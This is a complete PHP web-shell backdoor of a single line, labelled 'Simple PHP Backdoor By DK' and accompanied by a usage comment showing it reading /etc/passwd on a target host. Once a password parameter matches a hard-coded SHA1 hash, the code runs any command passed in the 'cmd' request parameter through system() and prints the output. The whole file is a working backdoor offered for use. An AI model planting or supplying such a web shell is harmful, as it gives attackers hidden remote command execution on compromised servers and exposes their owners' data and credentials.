<!-- Ref: https://gist.github.com/sente/4dbb2b7bdda2647ba80b -->
<!-- Simple PHP Backdoor By DK (One-Liner Version) -->
<!-- Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd&k=password -->
<?php if(isset($_REQUEST['cmd']) && isset($_REQUEST['k']) && sha1($_REQUEST['k']) == '6701d3934ae8abc28577fc40477488fad748a85c'){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>